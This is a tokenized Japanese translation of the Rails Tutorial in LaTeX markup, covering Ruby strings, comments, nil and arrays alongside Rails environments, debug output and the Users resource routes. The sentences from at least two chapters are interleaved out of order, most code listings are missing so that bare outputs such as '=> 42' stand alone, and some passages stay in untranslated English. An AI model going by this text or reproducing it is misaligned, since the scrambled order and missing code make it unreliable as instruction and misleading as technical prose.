▁ デフォルトで は 、 コンソール は \ emph { development ▁( 開発 ) ▁ 環境 } という 、 Rails によって 定義された 3 種類 の 環境 のうち の 1 つ で 起動 します ▁( 他の 2 つ は \ emph { test ▁( テスト ) ▁ 環境 } と \ emph { production ▁( 本番 ) ▁ 環境 } です )。
▁この 区別 は この章 において は 重要 ではありません が 、\ ref { sec : rails _ environments } で これらの 環境 について 詳 細 に 説明します 。
▁Rails コンソール は 素 晴 しい 学習 ツール であり 、 その 中 を 自由に 探 索 できます 。 コンソール の中で 何 を し よう とも 、 何か を 壊 す ことは ▁( まず ) ▁ あり え ないので 、 ご 安 心 ください 。
▁Rails コンソール では 、 ス タ ッ ク から 抜 け る には Ctrl - C を 押 し 、 完全に コンソール を 終 了 するには Ctrl - D を 押 します 。
▁ 以後 この章 を 進め る に あ たり 、 有 用 な リソース である \ href { http :// ruby - doc . org /}{ Ruby ▁API } を参照 し ながら 学習 すること を ぜ ひ お勧め します 。 Ruby ▁API には 高 濃 縮 の 情報 が 詰 ま っています ▁( 少々 \ emph { 濃 厚 すぎる } とも 言 え ます )。 たとえば 、 Ruby の 文字列 の詳細 を 知りたい 場合は 、 Ruby ▁API エ ン ト リ の \ ko de { String } クラス を参照 すれば よい のです 。
▁< n >< n > ▁\ subsection { コメント } ▁% ▁( fold )< n > ▁\ label { sec : comments }< n >< n > Ruby ▁\ emph { comments } ▁ start ▁with ▁the ▁ p ound ▁ sign ~ \ ko de { \ # } ▁( al s o ▁c all ed ▁the ▁` ` hash ▁ m ar k ' ' ▁ or ▁( m or e ▁ p o e tic all y ) ▁the ▁` ` o c to th or p e ' ') ▁and ▁ ext end ▁to ▁the ▁end ▁of ▁the ▁ line .
▁Ruby は コメント の内容 を実行する ことはありません が 、 適切な コメント は それ を 読 む 人 間 にとって ▁( コードの 作 者 にとって も ) ▁ 非常に 有 用 です 。
▁ 以下のコード の場合 、
▁ 最初の 行 が 、 その後 に 定義されている 関数 の 目的 を 説明 している コメント です 。
▁ コメント を コンソール 内で 入力 する 人 は 普通 いません が 、 ここでは 学習 のために あえて 以下のように コメント を追加し てみましょう 。
▁=> ▁ 59
▁ この章 の コードを ▁( ファイル に保存 する ので なく ) ▁Rails コンソール に 入力 したり コ ピ ペ したり する とき であれば 、 コメント を省略 しても か ま いません 。 コメント を Rails コンソール に 入力 しても 、 コメント は 常に 無視 される ので 問題 ありません 。
▁< n >< n > ▁% ▁subsection ▁subsection _ name ▁( end )< n >< n > ▁\ subsection { 文字列 } ▁% ▁( fold )< n > ▁\ label { sec : string s }< n >< n >
▁\ emph { 文字列 ▁( string ) } ▁ は 、 Web アプリケーション において おそらく 最も 重要な データ 構造 です 。 これは 、 Web ページ という もの が 究 極 的に は サーバー から ブラウザに送信 された 文字列 に す ぎ ない ためです 。
▁それでは 、 コンソール で 文字列 について 調 べ てみましょう 。
▁=> ▁" foo "
▁ここで 入力 した もの は \ emph { 文字列 リ テ ラ ル } と 呼ばれ ▁( 面 白 い ことに \ emph { リ テ ラ ル 文字列 } とも 呼ばれ ます ) 、 ダ ブ ル ク ォ ート \ ko de { "} ▁ で 囲 む ことで 作成 できます 。
▁この コンソール は 、 入力 した それぞれの 行 を 評価 した 結果 を表示し ており 、 文字列 リ テ ラ ル の 場合には 文字列 自身 が表示されます 。
▁\ ko de { + } ▁ 演算子 を使用して 、 文字列を 結合 することもできます 。
▁=> ▁" foo bar "
▁ 評価 の 結果 は 、\ ko de { " foo "} ▁ と ▁\ ko de { " bar "} ▁ を 足 した \ ko de { " foo bar "} に なりました
▁ より 詳 細 な “ foo ” と “ bar ” の 起 源 については 、\ emph { J ar g on ▁ File の “ foo ” という 記事 } ▁( 英語 ) ▁ を参照してください 。 ちなみに " foo bar と " F U B A R " には \ href { http :// www . cat b . org / j ar g on / html / F / foo . html } { 全 く 関係 が ありません で した } 。
▁=> ▁" Michael "
▁ 苗 字 と 名前 の 両方 を 変数 に 割り当て る こともできます 。
▁=> ▁" H ar t l "
▁ 最後の 2 つの 結果 は 同 等 である ことにご注目ください 。 なお 、 著者 は 後 者 の 式 展開 の 方が 好 み です 。 空白 を \ ko de { " ▁" } のように 直接 加 え る のは どう も ぎ こ ち なく 思 え ます 。
▁ 文字列を \ emph { 出力 } するために 、 Ruby の 関数 で 最も 一般に 使われ る のは \ ko de { put s } です ▁( put の 三 人 称 単 数 現在 形 ではなく 「 put ▁ string 」 なので 、「 put ▁ ess 」 と 発 音 します )。
▁=> ▁nil
▁\ ko de { put s } メソッド では \ emph { 副 作 用 } が 重要な 役 割 を 果 た します 。 どう い う こと か と 言 う と 、\ ko de { put s ▁" foo "} は 文字列 「 " foo " 」 を 副 作 用 として ス ク リ ー ン に 表示 します が 、 返 り 値 には 「\ href { http :// www . an s w er s . com / nil } { 文字 ど お り の 無 }」 である \ ko de { nil } を返します 。 nil は 「 何 にも ない 」 こと を表す Ruby の 特別な 値 です 。
▁なお 、\ ko de { => ▁nil } ▁という 結果 は 、 簡 素 化 のために 今後 省略 する ことがあります 。
▁\ ko de { p r in t } メソッド も 同様 の 出力 を行います が 、 以下のように 、 改 行 文字 を追加し ない 点が 異なります 。
▁ foo => ▁nil
▁ シ ング ル ク ォ ート 内の 文字列
▁ これまで の例 では すべて \ emph { ダ ブ ル ク ォ ート 文字列 } を使用して い ましたが 、 Ruby では \ emph { シ ング ル ク ォ ート } も サポート しています 。
▁ ほとんど の場合 、 ダ ブ ル ク ォ ート と シ ング ル ク ォ ート の どちら を使用して も 実 質 的に 同じです 。
▁ただし 、 1 つ 重要な 違 い があります 。 Ruby は シ ング ル ク ォ ート 文字列 の中で は 式 展開 を行い ません 。
▁=> ▁" \ # { foo } ▁ bar "
▁ ダ ブ ル ク ォ ート 文字列 でも シ ング ル ク ォ ート 文字列 と同じ ことができ 、 ダ ブ ル ク ォ ート 文字列 では 式 展開 も できる のであれば 、 シ ング ル ク ォ ート 文字列 には ど のような 使い 道 がある の でしょう か 。
▁ シ ング ル ク ォ ート は 、 入力 した 文字 を エスケープ せずに 「 そのまま 」 保 持 するときに 便利です 。
▁ シ ング ル ク ォ ート で 文字列を 囲 め ば 、 簡単に バ ッ ク ス ラ ッ シ ュ 文字 のような 特 殊 文字 を そのまま 変数 に含め ることができます 。
▁ このような 些 細 な 例 の場合は それ ほど 問題 になり ません が 、 以下のように エスケープ の 必要な 文字 が 大 量 にある 場合には 、 シ ング ル ク ォ ート は 非常に 便利です 。
▁=> ▁" New line s ▁(\ \ n ) ▁and ▁t a b s ▁(\ \ t ) ▁ b o th ▁use ▁the ▁ b ack s la sh ▁ cha r a c ter ▁\ \ . "
▁最後に もう一度 申 し 上 げ ます 。 ほとんど の場合 、 シ ング ル ク ォ ート と ダ ブ ル ク ォ ート の どちら を 使 お う と 大きな 違 い はありません 。 実際 、 一 般 の ソースコード では 、 明 確 な 理由 も なく 両者 が 混 用 されている ケース を よく 見 かけ ます 。
▁以上で Ruby の 文字列 に関する 説明 は 終わり です 。 あ 、 言 い 忘れ ていた こと があり ました ね 。 「 Ruby の 世界 へ よう こ そ ! 」
▁Ruby では 、 あらゆる もの が \ ko de { オブジェクト } です 。 文字列 や \ emph { nil } です ら オブジェクト です 。
▁We ’ ll ▁ s e e ▁the ▁ te ch n ical ▁ me an ing ▁of ▁this ▁in ▁S ec tion ▁\ ref { sec : a _ class _ of _ our _ own } , ▁ b u t ▁I ▁do n ’ t ▁ th in k ▁ any one ▁ e ver ▁ u nder st oo d ▁ objects ▁ by ▁ read ing ▁the ▁def in i tion ▁in ▁a ▁ book ; ▁you ▁ ha ve ▁to ▁ build ▁ up ▁your ▁in t u i tion ▁for ▁ objects ▁ by ▁ s e e ing ▁ lo t s ▁of ▁ example s .
▁ 逆 に 、 オブジェクトが 何 を \ emph { する } か を 説明 する のは 簡単 です 。 オブジェクト とは ▁( い つ い か な る 場合に も ) ▁ メッセージ に応答する ものです 。
▁ 文字列 のような オブジェクトは 、 たとえば \ ko de { length } という メッセージ に 応答 できます が 、 これは 文字列 の 文字 数 を返します 。
▁ オブジェクト に渡され る メッセージ は 、 一般に は \ emph { メソッド } と 呼ばれ ます 。 メソッドの 実 体 は 、 そのオブジェクト に 定義された 関数 です
▁ この章 の 全体 に わ た って 、\ emph { 関数 } という 言 葉 と \ emph { メソッド } という 言 葉 が 混 在 している ことを 前 も って お 詫 び いた します 。 Ruby では 関数 と メソッド には 何 の違い も ありません 。 すべての メソッドは 関数 であり 、 すべての 関数 は メソッドで もあります 。 それ も これ も 、 あらゆる もの が オブジェクト である からです 。
▁Ruby の 文字列 は 、 以下のように \ ko de { empty ?} メソッド にも 応答 することができます 。
▁\ ko de { empty ?} メソッドの 末尾 にある 疑問符 にご注目ください 。
▁Ruby では 、 メソッドが \ emph { true } または \ emph { false } という \ ko de { 論理値 ( boolean ) } を返す ことを 末尾 の 疑問符 で 示す 慣習 があります 。
▁ 論理値 は 、 特に \ emph { 処理 の 流れ を変更する } ときに 有 用 です 。
▁=> ▁" The ▁ string ▁is ▁ n on empty "
▁ 条件 文 を 2 つ 以上 含 め たい場合は 、\ ko de { e l s if } ▁(\ ko de { else } ▁+ ▁\ ko de { if }) ▁という 文 を使います 。
▁User モデル が でき あ が った ので 、 いよいよ ユーザー登録 機能 を追加しましょう 。
▁\ ref { sec : signup _ form } では HTML ▁\ emph { フォーム } を使用して 登録 情報を Web アプリケーションに 送信 します 。 続いて \ ref { sec : success f ul _ signup s } では ユーザーを 新規作成 して 情報を データベースに保存 します 。
▁ ユーザー登録 手 続 き の最後 には 、 作成された ユーザーの 新しい プロファイル を 表示 できるように するために 、 ユーザーを \ emph { 表示する } ための ページ を作成し 、 ユーザー 用の REST アーキテクチャ を実装する 第 一 歩 を 踏 み 出 します ▁(\ ref { sec : mvc _ in _ action })。
▁ それ に 伴 い 、\ ref { sec : layout _ link _ tests } で 実装 した 簡 明 かつ 表現 豊 か な 統合テスト に対して 、 ▁ いくつかの テスト を追加し ていきます 。
▁ 本 章では 、 第 \ ref { cha : modeling _ users } 章 で作成した User モデル のバリデーション を 信 頼 し 、 有効な メールアドレスを 持 っている ▁( 可能性 のある ) ▁ 新規ユーザー を 増 や していきます 。
▁ 第 \ ref { cha : account _ activation _ and _ password _ reset } 章では 、 ▁ メールアドレス が \ emph { 本当に } 有効 であることを 確かめ るために 、\ emph { アカウントを有効化する } 機能を サインアップ の 手順 に追加します 。
▁" O n e ▁of ▁the ▁ string s ▁is ▁ empty "
▁" x ▁is ▁ not ▁ empty "
▁Ruby では 、 あらゆる もの が オブジェクト です 。 従って 、\ ko de { nil } も オブジェクト であり 、 これ も 多くの メソッド に 応答 できます 。
▁ ほぼ あらゆる オブジェクトを 文字列 に変換 する \ ko de { to \_ s } メソッドを使用して 、 nil が メソッド に応答する 例 を お 目 に かけ ましょう 。
▁この節では 、 まず ユーザーの 名前 と プロファイル 写 真 を表示する ための ページ を作成します 。 モックアップ を 図 \ ref { fig : profile _ mockup _ profile _ name } に 示 しました
▁ 確 か に 空 文字列 が 出力 されました 。 今度は \ emph { nil } に対して メッセージ を \ ko de { 連 鎖 ▁( cha in ) } ▁ して 渡 せる ことを確認します 。
▁ユーザー プロファイル ページの 最終的な 目 標 は 、 図 \ ref { fig : profile _ mockup } のように ユーザーの プロファイル 写 真 と 基本 ユーザー データ 、 そして マイクロポストの 一覧 を表示する ことです 。
▁ No M e th o d Error : ▁ un de f in ed ▁ method ▁` empty ? '
▁( 図 \ ref { fig : profile _ mockup } では 、 有 名 な \ emph { lo re m ▁ ip sum } ダ ミ ー テキスト を使用しています 。 この テキスト の 成 り 立 ち には \ href { http :// www . s tr a ig h t do p e . com / column s / read / 22 9 0 / what - do es - the - fi ll er - text - lo re m - ip sum - me an } { 面 白 い エ ピ ソ ー ド } が あるので 機 会 があり ました ら どう ぞ 。 )
▁# ▁ メッセージ の 連 鎖
▁この ページ を作成し たら 、 第 \ ref { cha : following _ users } 章 の サンプル ・ アプリケーション で使用する 予定です 。
▁ バージョン管理 を 使用している 場合は 、 い つ も と同じ ように トピックブランチ を作成します 。
▁この ように 、\ ko de { nil } オブジェクト 自身 は \ ko de { empty ?} メソッド には 応答 しない にも か か わ らず 、\ ko de { nil . to \_ s } と すると 応答 する ことがわかります 。
▁ 皆 さ ん の ご 推 察 ど お り 、 実は \ ko de { nil } かどうか を調べ る メソッド もあります 。
▁ sign - up
▁ この節 で 作成する ユーザー プロファイル のモックアップ
▁ 理 想 と する 最終的な プロファイル ページのモックアップ
▁Rails の 3 つの 環境
▁ この節 で 作成する プロファイル は 、 この アプリケーション における 初めて の 真 に 動的な ページ になります 。
▁\ ko de { if } キーワード の 別の 使い 方 を 示 しています 。 Ruby では この ように 、 後 続 する \ ko de { if } で の 条件 式 が 真 の ときに だけ 実行される 式 ▁( 後 続 if ) ▁ を 書く ことができ 、 コードが 非常に 簡潔 になります 。
▁ ビュー そのもの は 1 ページ のコード ですが 、 アプリケーションの データベースから 取り出し た 情報 を使用して 各 プロファイル の 表示 を カスタマイズ します 。
▁なお 、\ ko de { unless } キーワード も同様に 使用できます 。
▁ サンプルアプリケーション に 動的な ページ を追加する 準備 として 、 ここで Web サイトの レイアウト に デバッグ情報 を追加しましょう ▁( リスト \ ref { code : rails _ debug })。
▁これにより 、 ビルトイン の \ ko de { debug } メソッドと \ ko de { params } 変数 を使用して 、 各 プロファイル ページに デバッグ 用の 情報 が表示される ようになります ▁( 詳 細 については \ ref { sec : a _ users _ resource } で 解説します )。
▁ サイトの レイアウト に デバッグ情報 を追加する
▁ The ▁ string ▁' foo bar ' ▁is ▁ n on empty .
▁Ruby において \ ko de { nil } は 特別な オブジェクト です 。 Ruby の オブジェクト のうち 、 オブジェクト そのもの の 論理値 が false になる のは 、\ ko de { false } 自身 と nil の 2 つ \ emph { しか ありません } 。
▁なお 、 「\ ko de { ! ! } 」( 「 バ ン バ ン ▁( b an g ▁ b an g )」 と 読み ます ) ▁という 演算子 を使うと 、 そのオブジェクト を 2 回 否 定 すること になる ので 、 どんな オブジェクト も 強 制 的に 論理値 に変換 できます 。
▁その 他の あらゆる Ruby の オブジェクトは 、 ゼ ロ です ら \ emph { true } です 。
▁ 本番環境 に 展開 した アプリケーション では デバッグ情報 を表示し たくない ので 、 リスト \ ref { code : rails _ debug } には 以下 を 記述 して あります 。
▁Rails コンソール でも 、 リスト \ ref { code : static _ pages _ controller } の ▁\ ko de { home } ▁ アクション や 、 リスト \ ref { code : title _ helper } の \ ko de { full \_ title } ヘルパー と同じ 方法で メソッド を定義する ことができます
▁ 実は 、 この 3 つ 以外に も カスタム の 環境 を作成する ことができます 。 詳 細 については 「\ href { http :// rails casts . com / e p is odes / 7 2 - adding - an - environment } { 環境 を追加した 場合 の RailsCast } ▁( 英語 )」 を参照してください 。
▁( メソッドの 定義 は ファイル で 行う の が 普通 なので 、 コンソール で 行う のは 少々 面倒 ですが 、 デ モ ン スト ー レ ション 目的 であれば 十分 です )。
▁ 特に 、\ ko de { Rails . env . development ?} が \ ko de { true } になる のは 開発環境 に 限 られ るため 、 以下の 埋め込み Ruby は
▁たとえば 、\ ko de { 引数 } を 1 つ 取り 、 引数 が 空 かどうか に 基 づ いた メッセージ を返す \ emph { string \_ message } という 関数 を定義し てみましょう 。
▁ 本番 アプリケーション や テスト で 挿 入 される ことはありません 。
▁I t ' s ▁ an ▁ empty ▁ string !
▁( テスト 環境で デバッグ情報 が表示され ても 直接 問題 になる ことはありません が 、 よい こと ではありません 。 デバッグ情報 は 開発環境 以外 では 使用 すべき ではありません 。 )
▁ else
▁ The ▁ string ▁is ▁ n on empty .
▁Rails には テスト 環境 ▁(\ text tt { test }) 、 開発環境 ▁(\ text tt { development }) 、 そして 本番環境 ▁(\ text tt { production }) ▁ の 3 つの 環境 が デフォルトで 装 備 されています 。
▁end
▁Rails ▁console の デフォルトの 環境 は \ text tt { development } です 。
▁$ ▁ rails ▁console
▁ L o ad ing ▁ development ▁ environment
▁ >> ▁Rails . env
▁=> ▁" development "
▁ >> ▁Rails . env . development ?
▁ 最後の 例 を見ると 分 か るように 、 メソッドの 引数 を省略 すること も 可能です ▁( かっこ です ら 省略 可能です )。
▁< n > ▁=> ▁true
▁これは 、 以下のコード では
▁ >> ▁Rails . env . test ?
▁=> ▁false
▁ 引数に \ emph { デフォルト } 値 を含め ている からです ▁( この 例 の デフォルト値 は 空 の 文字列 です )。
▁この ように 指定 すると 、\ ko de { s tr } 変数 に 引数 を 渡す ことも 渡 さ ない こともできます 。 引数 を 渡 さ ない場合は 、 指定 の デフォルト値 が自動的に 使用されます 。
▁上の ように 、 Rails には \ text tt { Rails } という オブジェクト があり 、 それ には 環境 の 論理値 ▁( boolean ) ▁ を 取 る \ text tt { env } という 属性 があります 。 たとえば 、\ text tt { Rails . env . test ?} は テスト 環境で は \ text tt { true } を返し 、 それ以外の 環境で は \ text tt { false } を返します 。
▁ここで 、 Ruby の 関数 には 「\ emph { 暗 黙 の 戻り値 } がある 」 ことにご注意ください 。 これは 、 関数 内で 最後に 評価 された 式 の値 が自動的に 返される ことを 意味 します ▁( 訳 注 : ▁ 関数 で 戻り値 を明示的に指定 し なかった 場合 の動作 です )。 この場合 、 引数 の \ ko de { s tr } が 空 かどうか に応じて 、 2 つの メッセージ 文字列 のうち のいずれか を返します 。
▁ テスト 環境 の デバッグ など 、 他の 環境で console を実行する 必要 が生じ た場合 は 、 環境 を パラメータ として \ text tt { console } スクリプト に 渡す ことができます 。
▁もちろん 、 Ruby では 戻り値 を明示的に指定 することもできます 。 以下の 関数 は 上の 関数 と同じ 結果 を返します 。
▁$ ▁ rails ▁console ▁test
▁ L o ad ing ▁test ▁ environment
▁=> ▁" test "
▁上の 説明 で 気 付 いた 方 も いる と思います が 、 2 番目の \ ko de { return } は 実は なくても か ま いません 。 関数 中 の最後 に置かれ た 式 ▁( この場合は ▁\ ko de { " The ▁ string ▁is ▁ n on empty . " }) ▁ は 、\ ko de { return } キーワード が なくても 暗 黙 で 値 を返す ためです 。 ここでは 、 両方 に \ ko de { return } を使用する 方が 見 た 目 の 対 称 性 が 保 た れる ので 好 ま しい と 言 え ます 。
▁Rails サーバー では console の デフォルトの 環境 として \ text tt { development } が使用されます が 、 以下のように 他の 環境で console を実行する こともできます 。
▁ メソッドで 引数 の 変数 名 に どんな 名前 を使って も 、 メソッドの 呼び出し 側 には 何 の 影 響 も 生 じ ない という 点 にも ご 注 目 ください 。
▁$ ▁ rails ▁ server ▁-- environment ▁ production
▁つまり 、 最初の 例 の \ ko de { s tr } を 別の 変数 名 ▁(\ ko de { the \_ f un c tion \_ ar g um ent } など ) ▁ に変更 しても 、 メソッドの 呼び出し 方は 全 く 同じです 。
▁ アプリケーションを 本番環境で 実行 する 場合 、 本番 の データベース が 利用 できない と アプリケーションを 実行 できません 。 そのため 、\ text tt { rake ▁ db : migrate } を 本番環境で 実行 して 本番 データベース を作成します 。
▁$ ▁bundle ▁exec ▁rake ▁ db : migrate ▁ R A I L S _ ENV = production
▁( 注 : ▁console 、 server 、 migrate の 3 つの コマンド では 、 デフォルト 以外の 環境 を指定する 方法 が それぞれ 異 な っ ており 、 混 乱 を 招 く 可能性があります 。 このため 、 3 つの 場合 の すべて を 本 コ ラ ム で 説明 しました 。 )
▁ ところで 、 サンプルアプリケーション を 既に Heroku 上 に デプロイ している 場合は 、\ text tt { heroku ▁run ▁console } という コマンド を 打 つ ことで 、 本番環境 を確認する ことができます 。
▁$ ▁ heroku ▁run ▁console
▁=> ▁" production "
▁ >> ▁Rails . env . production ?
▁ とは い う もの の 、 まだ 理解 していない ことが \ emph { 1 つ } あります 。 \ emph { Rails が \ emph { どのように して } これら を 結 び つ け ている か ということです 。 URL を アクションに マ ッ プ する方法 や 、\ ko de { full \_ title } } ヘルパー を ビューで 利用 できるように する方法 など が そう です 。
▁ 当 然 ながら 、 Heroku は 本番 サイト 用の プラットフォーム なので 、 実行される アプリケーション はすべて 本番環境 となります 。
▁( この 点 を 深 く 理解 したい 方 には 、 「\ emph { The ▁Rails ▁4 ▁ W a y } 」( O b i e ▁F er n and e z 著 ) ▁ が お勧め です ) ▁ 。
▁ デバッグ 出力 を き れ い に 整 形 するために 、 第 \ ref { cha : fi ll ing _ in _ the _ layout } 章 で作成した カスタム スタイルシート を リスト \ ref { code : m i x in _ and _ debug } の よう に追加します 。
▁ これはリスト \ ref { code : an not at ed _ title _ helper } で使用されていま した 。
▁ デバッグ 表示 を 整 形 するための 追加 と 、 Sass の ミ ッ ク ス イン .
▁ 注 釈 付き の \ ko de { title \_ helper } .
▁ここで Sass の \ emph { ミ ッ ク ス イン } 機能 ▁( ここでは \ ko de { box \_ s i z ing }) ▁ を使用しています 。
▁# ▁ コメント 行
▁ ミ ッ ク ス イン 機能 を使用することで 、 CSS ルール の グループ を パ ッ ケ ー ジ 化 して 複数の 要素 に適用 することができます 。 たとえば 以下のような 変 換 を行います 。
▁ メソッド
▁ ミ ッ ク ス イン は \ ref { sec : us ing _ form _ for } でも 使用します 。
▁ 今回の 場合 、 デバッグ 出力 は 図 \ ref { fig : home _ page _ with _ debug } のようになります 。
▁# ▁ 論理値 テスト
▁ サンプルアプリケーションの Home ページに デバッグ情報 を表示する
▁ 図 \ ref { fig : home _ page _ with _ debug } の デバッグ 出力 には 、 描画 される ページの 状態 を 把 握 するのに 役 立 つ 情報 が含まれ ます 。
▁Rails の \ ko de { debug } 情報 は ▁\ href { http :// www . y am l . org /}{ Y A M L } ▁( 一 種 の \ href { http :// cat b . org / j ar g on / html / R / re c ur s ive - a c r on y m . html } { 再 帰 的 略 語 } であり 、 “ Y A M L ▁A in ’ t ▁Ma r k up ▁ L an g u age ” ▁ の 略 と されています ) ▁ 形式 で 表示 されます 。 Y A M L は 人 間 \ emph { だけで なく } コンピュータ にとって も 読み やすい 形式 です 。
▁\ ref { sec : a _ users _ resource } には 別の 例 もあります 。
▁ユーザー プロファイル ページ を作成する には 、 その 前に データベースに ユーザーが 登録 されている 必要があります 。 これは い わ ゆ る 「 卵 が 先 か 鶏 が 先 か 」 問題 です 。 この Web サイト では 、 登録 ページ がない 状態 で どう や って ユーザーを 登録 しておけば よいでしょう か 。
▁ 幸 い 、 この問題 は 既に 解決 されています 。 \ ref { sec : creat ing _ and _ a u the n tic at ing _ a _ user } で Rails コンソール を使用して ユーザー レコード を 登録 して あり ました 。 したがって 、 データベース の中に 一 人のユーザー が いる はずです 。
▁( この問題 を 指 摘 い ただ いた J er e my ▁F le is ch ma n に 感 謝 します )。
▁( も し まだ データベース 上 に 一 人 も ユーザーが い ない場合は 、\ ref { sec : creat ing _ and _ a u the n tic at ing _ a _ user } に 戻 って ユーザーを 追加 してください 。 )
▁最後に 、\ ko de { module ▁ Application Helper } という 要素 について解説します 。 モジュール は 、 関連 した メソッドを まとめ る 方法 の ひとつ で 、 Ruby の クラス で \ ko de { include } を使用すると 、 この モジュール を \ emph { ミ ッ ク ス イン ▁( m i x ed ▁in ) } できます 。
▁ 先ほど 、 コンソール の 出力結果 から ユーザーの ID が ▁\ ko de {1} ▁ である ことを確認 しました 。 次の 目 標 は 、 このような ユーザー情報 を Web アプリケーション 上 に 表示 することです 。
▁ 単なる Ruby の コードを 書く のであれば 、 モジュール を作成する たびに 明示的に インクルード して 使用する のが普通です が 、 Rails では 自動的に ヘルパー モジュール を インクルード し てくれる ので 、 include 行 を わざわざ 書く 必要 が ありません 。
▁ The ▁ re s ul t ▁is ▁that ▁the ▁\ ko de { full \_ title } ▁ method ▁is ▁\ href { http :// cat b . org / j ar g on / html / A / auto ma g ical ly . html } { auto ma g ical ly } ▁ available ▁in ▁ all ▁ our ▁ views .
▁ REST の 原 則 に 従 場合 、 リソース への 参 照 は リソース 名 と ユ ニ ー ク ID を使用する のが普通です 。
▁< n >< n > ▁% ▁subsection ▁ b ack _ to _ the _ title _ helper ▁( end )< n >< n > ▁\ section { 他の データ 構造 } ▁% ▁( fold )< n > ▁\ label { sec : other _ data _ structure s }< n >< n >
▁ ユーザーを \ emph { リソース } と み な す 場合 、 id = \ ko de {1} のユーザー を参照 する ということ は 、 / users /1 という URL に対して \ text tt { GET } リクエストを 発行する ということ を 意味 します 。
▁Web アプリケーション は 突 き 詰 め れば ただ の 文字列 に 過 ぎ ません が 、 実際には これらの 文字列を \ emph { 作る } ために 文字列 以外の データ 構造 も 必要 となります 。
▁ここで \ ko de { show } という アクション の 種類 は 、\ emph { 暗 黙 } の リクエスト になります 。 Rails の REST 機能 が 有効 になっている と 、\ text tt { GET } リクエスト は自動的に \ ko de { show } アクション として 扱 わ れ ます 。
▁この節では 、 Rails アプリケーションを 書く ために 重要 となる 、 いくつかの Ruby の データ 構造 について説明し ます 。
▁\ ref { sec : a _ user _ to ur } で説明した とおり 、 id = \ ko de {1} のユーザー にアクセス するための ページの U R I は / users /1 となります 。
▁< n >< n > ▁\ subsection { 配列 と 範囲 演算子 } ▁% ▁( fold )< n > ▁\ label { sec : array s _ and _ range s }< n >< n >
▁ 配列 ▁( array ) ▁ は 、 特定の 順序 を持つ 要素 の リスト です 。
▁ただし 、 現 時点 で この URL を使用して も エラー になります ▁( 図 \ ref { fig : profile _ routing _ error })。
▁\ emph { Rails チュートリアル } では これまで 配列 について 解 説 していません で した が 、 配列 を理解する ことは 、 ハッシュ ▁(\ ref { sec : hash es _ and _ symbol s }) ▁ や Rails の データモデル を理解する ための 重要な 基 盤 となります ▁( データモデル とは \ ko de { has \_ many } などの 関連付け の こと であり 、\ ref { sec : demo _ user _ has _ many _ microposts } や \ ref { sec : user _ micropost _ association s } で 詳 しく 説明します )。
▁ / users /1 にアクセス した 時の エラー ログ
▁Ruby の 文字列 の 理解 に だ い ぶ 時間 を使って し ま い ました ので 、 次に 進 む ことにします 。 \ ko de { s p li t } メソッドを使用すると 、 文字列を 自 然 に変換 した 配列 を得る ことができます 。
▁ / users /1 ▁ の URL を有効に するために 、 routes ファイル ▁(\ ko de { config / routes . rb }) に 以下の 1 行 を追加します 。
▁作成した コードをリスト \ ref { code : users _ resource } に示します
▁この 操作 によって 、 3 つの 文字列 から な る 配列 が 得られ ます 。
▁ Users リソース を routes ファイル に追加する
▁\ ko de { s p li t } で 文字列を 区切 って 配列 に するときに はデフォルトで 空白 が使用されます が 、 以下のように 他の 文字 を指定して 区切 る こともできます 。
▁ 特定の ユーザー を表示する ページ
▁ / users /1
▁ 多くの コンピュータ 言語 の 慣習 と同様 、 Ruby の配列 でも \ emph { ゼ ロ オ リ ジ ン } を 採 用 しています 。 これは 、 配列 の最初の 要素 の インデックス が 0 から 始 まり 、 2 番 目 は 1 ... と 続 く ことを 意味 します 。
▁ この時点で は 、\ emph { ルーティング } は 動作 しています が 、 対応する ページ が 動作 している とは 限 り ません 。
▁=> ▁[ 4 2, ▁ 8 , ▁ 17 ]
▁たとえば 、 / users /1/ edit ▁ が Users コントローラの \ ko de { edit } アクションに 正常に ルーティング されている として も 、\ ko de { edit } アクション が存在し なければ 、 この URL にアクセス したときに エラー になります 。
▁=> ▁4 2
▁この 行 に対応する URL 、 アクション 、 名前付きルート は 表 \ ref { table : RESTful _ users } のようになります
▁=> ▁ 17
▁( 表 \ ref { table : demo _ RESTful _ users } と の違い を 比 較 してみてください )。
▁ 次の 3 つの 章 に 渡 って 、 表 \ ref { table : RESTful _ users } の 他の 項目 も 利用 して 、 Users リソース を 完全に RESTful な リソース に するために 必要な アクション をすべて 作成する 予定です 。
▁ 上 で示した とおり 、 配列 の 要素 にアクセス するには 角 かっこ を使用します 。
▁Ruby では 、 角 かっこ 以外に も 配列 の 要素 にアクセス する方法 が 提供され ています
▁ このコード で 使用している \ ko de { sec on d } メソッドは 、 実は Ruby 自身 の一部 ではなく 、 Rails が 追加 した ものです 。
▁ / users
▁この コードが 動作する のは 、 Rails による Ruby の 拡 張 が Rails コンソール によって自動的に 反 映 される からです 。
▁ すべての ユーザーを 一覧 する ページ
▁ / users / new
▁ 最後の 行 では 、 等 しい ことを確認する 比 較 演算子 \ ko de { = = } を使って み ました 。 この 演算子 や ▁\ ko de { ! = } ▁( “ 等 しく ない ” ) ▁ などの 演算子 は 、 他の 多くの 言語 と 共通 です 。
▁ ユーザーを 新規作成 する ページ ▁( ユーザー登録 )
▁ユーザー を作成する アクション
▁ / users /1/ edit
▁id = \ ko de {1} の ユーザーを 編集 する ページ
▁ユーザー を更新する アクション
▁ 配列 は 、 上 記 コード の最初の 行 の \ ko de { length } メソッド 以外に も 、 さまざまな メソッド に 応答 します 。
▁ユーザー を削除する アクション
▁リスト \ ref { code : users _ resource } の Users リソース が提供する RESTful な ルート
▁リスト \ ref { code : users _ resource } のコード を使用することで 、 ルーティング が 有効 になります 。 ただし 、 ルーティング 先 の ページ はまだ ありません ▁( 図 \ ref { fig : user _ show _ un k now n _ action })。
▁=> ▁[ 8 , ▁ 17 , ▁4 2 ]
▁ この問題 を 解決 するために 、\ ref { sec : a _ gravatar _ image } で 最 小 限 の プロファイル ページ を作成する 予定です 。
▁=> ▁[ 17 , ▁ 8 , ▁4 2 ]
▁ URL ▁ / users /1 ▁ の ルーティング は 有効 だ が ページ がない 状態
▁=> ▁[ 17 , ▁4 2, ▁ 8 ]
▁ これはリスト \ ref { code : st ub _ user _ view } で使用されていま した 。
▁上の どの メソッド を実行し た場合 にも 、\ ko de { a } 自身 は 変更 されていない という 点 にご注目ください 。
▁ ユーザー情報 を表示する ための 仮 の ビュー
▁ 配列 の内容 を \ emph { 変更 } したい場合は 、 その メソッド に対応する 「 破 壊 的 」 メソッド を使用します 。 破 壊 的 メソッド の名前 には 、 元の メソッドの 末尾 に 「 ! 」 を追加した もの を使用する の が Ruby の 慣習 です 。
